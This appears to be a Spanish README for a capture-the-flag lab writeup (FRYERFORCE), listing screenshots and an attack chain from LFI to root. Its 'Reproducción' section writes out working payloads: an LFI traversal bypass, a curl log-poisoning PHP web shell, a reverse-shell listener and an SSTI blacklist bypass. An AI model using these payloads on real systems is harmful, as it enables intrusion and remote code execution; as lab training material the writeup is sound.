# FRYERFORCE — Writeup público

Auditoría de seguridad ofensiva del laboratorio **FRYERFORCE** de Whoami-Labs.

| | |
|---|---|
| **Objetivo** | `172.17.0.2` |
| **Analista** | chifay |
| **Dificultad** | Hard |
| **Resultado** | `www-data` → `industrial_chef` → `root` |
| **Flags** | `Whoami{REDACTED}` · `Whoami{REDACTED}` |
| **MITRE** | T1190, T1059.004, T1574.002, T1548.001 |
| **NIST** | OM-ADM-001 · SP 800-53: SI-10, AC-6, CM-6, SI-2 |

> Actividad realizada en un laboratorio autorizado con fines educativos. No debe reproducirse fuera de entornos con permiso explícito.

## Contenido del paquete

| Recurso | Ruta |
|---|---|
| Informe completo | [`FRYERFORCE_writeup.md`](./FRYERFORCE_writeup.md) |
| Capturas (20) | [`screenshots/`](screenshots/) |
| Hashes de las capturas | [`screenshots/sha256sums.txt`](screenshots/sha256sums.txt) |

## Cadena de ataque

| Fase | Técnica | Resultado |
|---|---|---|
| 1. Reconocimiento | `nmap -sV -sC -p22,80` | SSH 8.4p1 y Apache 2.4.66 |
| 2. Acceso inicial | LFI con bypass `....//` | Lectura de archivos y código fuente |
| 3. Ejecución | *Log poisoning* de `access.log` | RCE como `www-data` |
| 4. Post-explotación | `netstat -tlnp` | API Flask en `127.0.0.1:8000` |
| 5. Salto de usuario | SSTI con bypass de lista negra | RCE como `industrial_chef` + flag de usuario |
| 6. Escalada | *Shared library hijacking* vía `RUNPATH` | `root` + flag final |

## Galería de capturas

| # | Archivo | Contenido | Sección |
|---|---|---|---|
| 01 | [`01_nmap.png`](screenshots/01_nmap.png) | Escaneo de servicios con Nmap | 3 |
| 02 | [`02_web.png`](screenshots/02_web.png) | Panel web legítimo | 3 |
| 03 | [`03_lfi_bypass.png`](screenshots/03_lfi_bypass.png) | Path traversal directo y bypass | 4 |
| 04 | [`04_index_source.png`](screenshots/04_index_source.png) | Código fuente de `index.php` | 4 |
| 05 | [`05_log_poison.png`](screenshots/05_log_poison.png) | `User-Agent` malicioso en el log | 5 |
| 06 | [`06_log_rce.png`](screenshots/06_log_rce.png) | Ejecución de `id` como `www-data` | 5 |
| 07 | [`07_reverse_shell.png`](screenshots/07_reverse_shell.png) | Reverse shell en el listener | 6 |
| 08 | [`08_shell_id.png`](screenshots/08_shell_id.png) | Identidad y contexto de la shell | 6 |
| 09 | [`09_internal_ports.png`](screenshots/09_internal_ports.png) | Puerto 8000 en loopback | 6 |
| 10 | [`10_api_root.png`](screenshots/10_api_root.png) | Endpoint raíz de la API | 6 |
| 11 | [`11_ssti_math.png`](screenshots/11_ssti_math.png) | Prueba `{{7*7}}` | 7 |
| 12 | [`12_ssti_rce.png`](screenshots/12_ssti_rce.png) | RCE como `industrial_chef` | 7 |
| 13 | [`13_user_flag.png`](screenshots/13_user_flag.png) | Flag de usuario (contenido difuminado) | 7 |
| 14 | [`14_suid_find.png`](screenshots/14_suid_find.png) | Enumeración de binarios SUID | 8 |
| 15 | [`15_readelf_rpath.png`](screenshots/15_readelf_rpath.png) | `RUNPATH` y `libfryer.so` | 8 |
| 16 | [`16_writable_rpath.png`](screenshots/16_writable_rpath.png) | `/var/tmp` escribible | 8 |
| 17 | [`17_malicious_lib.png`](screenshots/17_malicious_lib.png) | Código de la biblioteca maliciosa | 8 |
| 18 | [`18_compile.png`](screenshots/18_compile.png) | Compilación de `libfryer.so` | 8 |
| 19 | [`19_root_flag.png`](screenshots/19_root_flag.png) | `uid=0(root)` y flag final (contenido difuminado) | 8 |
| 20 | [`20_api_source.png`](screenshots/20_api_source.png) | Código fuente de `salt_api.py` | 7 |

> La numeración de las figuras del informe sigue el orden de lectura; el nombre de cada archivo conserva el orden de captura.

## Estructura del paquete

```text
FRYERFORCE/
├── FRYERFORCE_writeup.md
├── README.md
└── screenshots/
    ├── 01_nmap.png
    ├── ...
    ├── 20_api_source.png
    └── sha256sums.txt
```

## Notas de publicación

- Las banderas se muestran como `Whoami{REDACTED}`; solo se ocultó el contenido situado entre llaves.
- En las capturas `13_user_flag.png` y `19_root_flag.png` se difuminó la parte interior de la bandera.
- No se incluyen credenciales, archivos de evidencia originales ni el material auxiliar del laboratorio.

## Reproducción

La secuencia completa de comandos está en el **Anexo A** del informe. Resumen:

1. `nmap -sV -sC -p22,80 172.17.0.2`
2. LFI: `?sensor=....//....//....//....//etc/passwd`
3. *Log poisoning*: `curl -A '<?php system($_GET[c]); ?>' 'http://172.17.0.2/?sensor=temp_logs.txt'`
4. RCE: `?sensor=/var/log/apache2/access.log&c=id`
5. Reverse shell: `nc -lvnp 4449` + payload en el parámetro `c`
6. SSTI: `?name={{7*7}}` y bypass con `lipsum|attr("\x5f\x5fglobals\x5f\x5f")`
7. SUID: `readelf -d /usr/bin/fryer_audit` y `libfryer.so` en `/var/tmp/libs`
8. Root: `/tmp/rootbash -p /tmp/rootid.sh`
